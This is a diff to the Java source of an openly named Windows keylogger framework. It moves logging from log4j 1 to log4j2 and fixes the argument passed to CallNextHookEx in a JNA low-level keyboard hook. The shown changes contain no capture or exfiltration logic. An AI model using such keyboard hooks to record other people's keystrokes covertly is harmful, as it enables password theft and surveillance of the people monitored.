@@ -1,8 +1,10 @@
 package uk.co.baconi.keylogger.framework.impl;
 
 import com.sun.jna.Platform;
+import com.sun.jna.Pointer;
 import com.sun.jna.platform.win32.Kernel32;
 import com.sun.jna.platform.win32.User32;
+import com.sun.jna.platform.win32.WinDef;
 import com.sun.jna.platform.win32.WinDef.HMODULE;
 import com.sun.jna.platform.win32.WinDef.LRESULT;
 import com.sun.jna.platform.win32.WinDef.WPARAM;
@@ -11,7 +13,8 @@ import com.sun.jna.platform.win32.WinUser.HHOOK;
 import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
 import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
 import com.sun.jna.platform.win32.WinUser.MSG;
-import org.apache.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 import uk.co.baconi.keylogger.framework.constants.Numbers;
 import uk.co.baconi.keylogger.framework.impl.WindowsKeyLogger.WindowsKeyResult;
 import uk.co.baconi.keylogger.framework.interfaces.KeyLogger;
@@ -22,7 +25,7 @@ public final class WindowsKeyLogger extends AbstractImpl<WindowsKeyResult> imple
     private static final String LOG_ERROR_MSG = "This key logger implementation should only be used on a Windows OS.";
     private static final String EXCEPTION_ERROR_MSG = "This key logger implementation only supports Windows.";
 
-    private static final Logger LOG = Logger.getLogger(WindowsKeyLogger.class);
+    private static final Logger LOG = LogManager.getLogger();
 
     private static volatile boolean quit;
     private final HHOOK hhk;
@@ -108,7 +111,7 @@ public final class WindowsKeyLogger extends AbstractImpl<WindowsKeyResult> imple
                     }
                 }
             }
-            return User32.INSTANCE.CallNextHookEx(parent.getHHOOK(), nCode, wParam, info.getPointer());
+            return User32.INSTANCE.CallNextHookEx(parent.getHHOOK(), nCode, wParam, new WinDef.LPARAM(Pointer.nativeValue(info.getPointer())));
         }
     }
 
